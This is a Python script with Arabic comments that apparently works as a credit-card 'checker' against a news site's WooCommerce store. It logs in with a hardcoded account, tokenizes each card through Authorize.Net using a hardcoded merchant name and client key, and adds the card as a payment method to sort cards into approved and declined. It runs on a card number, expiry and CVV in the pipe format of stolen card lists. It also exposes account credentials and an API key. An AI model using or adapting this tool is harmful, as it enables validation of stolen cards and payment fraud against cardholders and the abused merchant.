import requests
import re
import json
import random
import time
from user_agent import generate_user_agent

def Stripe3(ccx):
    """
    فحص بطاقة على independent.com (Authorize.Net - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        # تنسيق التاريخ (MMYY)
        if len(yy) == 4:
            yy = yy[-2:]
        expiry = f"{mm}{yy}"
        
        user = generate_user_agent()
        r = requests.Session()
        site_url = "https://www.independent.com"
        
        print("\n" + "="*60)
        print(f"🔥 فحص: {n[:4]}...|{mm}|{yy}|{cvc}")
        print("="*60)
        
        # ===== 1. فتح صفحة الحساب لاستخراج login nonce =====
        print("\n[1/6] فتح صفحة الحساب...")
        headers = {
            'authority': 'www.independent.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://www.independent.com/my-account/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{site_url}/my-account/', headers=headers)
        print(f"    ✅ HTTP {response.status_code}")
        
        # استخراج login nonce
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not login_nonce:
            return "❌ Login nonce not found"
        login_nonce = login_nonce.group(1)
        print(f"    🔑 Login nonce: {login_nonce}")
        
        # ===== 2. تسجيل الدخول بحساب ثابت =====
        print("\n[2/6] تسجيل الدخول...")
        
        # بيانات الحساب من الريكويست الأصلي
        email = "sbhyjamryky@gmail.com"
        password = "F4team@738843"
        
        headers = {
            'authority': 'www.independent.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.independent.com',
            'referer': 'https://www.independent.com/my-account/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'username': email,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        response = r.post(f'{site_url}/my-account/', cookies=r.cookies, headers=headers, data=data)
        print(f"    ✅ تم تسجيل الدخول")
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        print("\n[3/6] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': 'www.independent.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://www.independent.com/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{site_url}/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        html = response.text
        print(f"    ✅ HTTP {response.status_code}")
        
        # ===== استخراج merchant name (ثابت) =====
        merchant_name = "TSBI805"
        print(f"    🔑 Merchant name: {merchant_name} (static)")
        
        # ===== استخراج client key (ثابت) =====
        client_key = "6pmYMC4xzh2DmJ46q62dRcVQ2Rt8QKQRjWx99CtGw7P24zfGzgfD6T6Rpw9LhFa4"
        print(f"    🔑 Client key: {client_key[:30]}... (static)")
        
        # استخراج add payment method nonce
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', html)
        if add_nonce:
            add_nonce = add_nonce.group(1)
            print(f"    🔑 Add payment nonce: {add_nonce}")
        else:
            return "❌ Add payment nonce not found"
        
        # ===== 4. إنشاء token عبر Authorize.Net API =====
        print("\n[4/6] إنشاء token عبر Authorize.Net...")
        
        # إنشاء ID عشوائي
        request_id = f"{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://www.independent.com',
            'Referer': 'https://www.independent.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        
        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': merchant_name,
                    'clientKey': client_key,
                },
                'data': {
                    'type': 'TOKEN',
                    'id': request_id,
                    'token': {
                        'cardNumber': n,
                        'expirationDate': expiry,
                        'cardCode': cvc,
                    },
                },
            },
        }
        
        response = r.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
        
        # ===== استخراج token من Authorize.Net =====
        try:
            response_text = response.content.decode('utf-8-sig')
            auth_response = json.loads(response_text)
            print(f"    📄 Authorize.Net Response received")
            
            # استخراج token من opaqueData
            opaque_data = auth_response.get('opaqueData', {})
            token = opaque_data.get('dataValue', '')
            
            if token:
                print(f"    ✅ Token obtained: {token[:30]}...")
            else:
                # محاولة استخراج token من securePaymentContainerResponse
                token_data = auth_response.get('securePaymentContainerResponse', {}).get('data', {})
                token = token_data.get('token', {}).get('token', '')
                if token:
                    print(f"    ✅ Token obtained: {token[:30]}...")
                else:
                    error_msg = auth_response.get('messages', {}).get('message', [{}])[0].get('text', 'Unknown error')
                    return f"❌ Authorize.Net error: {error_msg}"
                
        except UnicodeDecodeError as e:
            try:
                response_text = response.content.decode('utf-8')
                auth_response = json.loads(response_text)
                opaque_data = auth_response.get('opaqueData', {})
                token = opaque_data.get('dataValue', '')
                if token:
                    print(f"    ✅ Token obtained: {token[:30]}...")
                else:
                    return f"❌ Error parsing Authorize.Net response"
            except:
                return f"❌ Error parsing Authorize.Net response: {str(e)}"
        except Exception as e:
            return f"❌ Error parsing Authorize.Net response: {str(e)}"
        
        # ===== 5. إضافة البطاقة =====
        print("\n[5/6] إضافة البطاقة...")
        
        # استخراج آخر 4 أرقام
        last_four = n[-4:]
        
        # تحديد نوع البطاقة
        if n.startswith('4'):
            card_type = 'visa'
        elif n.startswith('5'):
            card_type = 'mastercard'
        elif n.startswith('3'):
            card_type = 'amex'
        else:
            card_type = 'unknown'
        
        headers = {
            'authority': 'www.independent.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.independent.com',
            'referer': 'https://www.independent.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'payment_method': 'authorize_net_cim_credit_card',
            'wc-authorize-net-cim-credit-card-context': 'shortcode',
            'wc-authorize-net-cim-credit-card-expiry': f'{mm} / {yy}',
            'wc-authorize-net-cim-credit-card-payment-nonce': token,
            'wc-authorize-net-cim-credit-card-payment-descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
            'wc-authorize-net-cim-credit-card-last-four': last_four,
            'wc-authorize-net-cim-credit-card-card-type': card_type,
            'wc-authorize-net-cim-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = r.post(f'{site_url}/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
        text = response.text
        
        print("\n" + "="*60)
        print(f"📄 Final Response: {text[:300]}")
        print("="*60)
        
        # ===== 6. تحليل النتيجة النهائية =====
        if 'Payment method successfully added' in text or 'successfully added' in text:
            return 'Approved ✅'
        elif 'declined' in text.lower():
            return 'Declined ❌'
        elif 'duplicate' in text.lower():
            return 'Approved (Duplicate) ✅'
        elif 'invalid' in text.lower():
            return 'Invalid card ❌'
        elif 'error' in text.lower():
            error_match = re.search(r'<li>(.*?)</li>', text)
            if error_match:
                return f'Error: {error_match.group(1)}'
            return 'Error ❌'
        else:
            return 'Unknown response'
        
    except Exception as e:
        return f'❌ Error: {str(e)}'


if __name__ == '__main__':
    test_card = "5053144268826238|09|2031|804"
    result = Stripe3(test_card)
    print(f'\n📇 Card: {test_card}\n📊 Result: {result}')